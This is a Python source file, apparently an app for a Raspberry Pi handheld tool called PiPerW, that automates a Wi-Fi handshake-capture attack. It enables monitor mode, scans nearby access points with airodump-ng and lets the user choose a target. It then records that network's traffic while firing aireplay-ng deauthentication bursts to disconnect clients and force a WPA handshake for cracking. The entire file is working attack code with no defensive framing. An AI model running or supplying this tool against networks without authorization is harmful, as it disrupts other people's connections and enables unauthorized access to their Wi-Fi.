from PiPerW.interfaces.app_interface import AppInterface
from PiPerW.driver.pheripherals import Pheripherals
from PiPerW.driver.display import Display
from PiPerW.helpers import Log, Config
from PiPerW.utils.Menu import Menu
import os, time, subprocess
import csv
import glob

display = Display()
pheripherals = Pheripherals()

class App(AppInterface):

    def __init__(self):
        super().__init__()
        self.ap = []
        self.mon_interface = Config['network']['interface'] + "mon"

    def init(self):
        display.text("Initializing\nHandshake Grab")
        time.sleep(1)

        # clear tmp files
        for f in glob.glob("PiPerW/tmp/scan*"):
            try: os.remove(f)
            except: pass

        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)

        iwconfig_res = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "Monitor" not in iwconfig_res.stdout:
            subprocess.run(["sudo", "airmon-ng", "start", Config['network']['interface']], capture_output=True)
            time.sleep(2)
        
        iwconfig_res = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if self.mon_interface not in iwconfig_res.stdout:
            if Config['network']['interface'] in iwconfig_res.stdout and "Monitor" in iwconfig_res.stdout:
                self.mon_interface = Config['network']['interface']
            else:
                display.text("Monitor mode err\nContinue anyway?")
                time.sleep(1)
                from PiPerW.utils.Menu import Menu
                menu = Menu(["Exit", "Continue"])
                cont = False
                while not self.is_stopped():
                    menu.show()
                    k = pheripherals.await_key()
                    if k is None or self.is_stopped() or k in ["back", "exit"]: return
                    if k == "up": menu.previous()
                    elif k == "down": menu.next()
                    elif k == "select":
                        if menu.index == 1:
                            cont = True
                        break
                if not cont:
                    return

        display.text("Scanning APs...\n\n[Press any key \nto stop]")

        scan = subprocess.Popen(["sudo", "airodump-ng", self.mon_interface, "--output-format", "csv", "-w", "PiPerW/tmp/scan"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        self.wait_for_input()

        scan.terminate()
        subprocess.run(["sudo", "killall", "airodump-ng"], capture_output=True)
        time.sleep(1)

        csv_file = 'PiPerW/tmp/scan-01.csv'
        if not os.path.exists(csv_file):
            display.text("No APs found.\n[Press any key]")
            self.wait_for_input()
            return

        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if len(row) < 14: continue
                bssid = row[0].strip()
                if bssid == 'BSSID' or bssid == 'Station MAC': continue
                if ':' in bssid:
                    channel = row[3].strip()
                    ssid = row[13].strip()
                    if bssid not in [a['BSSID'] for a in self.ap]:
                        self.ap.append({'BSSID': bssid, 'channel': channel, 'ESSID': ssid})

        if not self.ap:
            display.text("No APs found.\n[Press any key]")
            self.wait_for_input()
            return

        bssid_list = []
        for i in self.ap:
            name = (i['ESSID'] or "<Hidden>")[:10]
            bssid_list.append(f"{name} {i['BSSID']}")

        bssid_list.append("Exit")
        selector = Menu(bssid_list, "Capture from:")

        display.clear()
        selector.show()
        while not self.is_stopped():
            key = self.wait_for_input()
            if key == "up":
                selector.previous()
                selector.show()
            elif key == "down":
                selector.next()
                selector.show()
            elif key == "select":
                break
            elif key == "back":
                return

        idx = selector.index
        if idx == len(bssid_list) -1: return

        target_ap = self.ap[idx]
        bssid_mac = target_ap['BSSID']
        channel = target_ap['channel']
        ssid_name = target_ap['ESSID'] or "unknown"

        # Capture handshake loop
        save_cap = os.path.join(self.get_public_dir(), "files", f"{ssid_name}_{bssid_mac.replace(':', '')}_handshake")
        
        display.text(f"Capturing...\nCh: {channel}\n\n[Press BACK]")
        Log.info(f"Targeting {bssid_mac} on Ch {channel}")

        cap_proc = subprocess.Popen(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid_mac, "-w", save_cap, self.mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Occasional deauths to provoke handshake
        time.sleep(2)
        deauth_proc = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid_mac, self.mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        while not self.is_stopped():
            key = self.wait_for_input()
            if key == "back":
                break

        Log.info("Stopping capture")
        cap_proc.terminate()
        try: deauth_proc.terminate()
        except: pass
        subprocess.run(["sudo", "killall", "airodump-ng"], capture_output=True)
        
        display.text("Capture stopped.\nSaved to /public")
        self.wait_for_input()

    def run(self):
        self.init()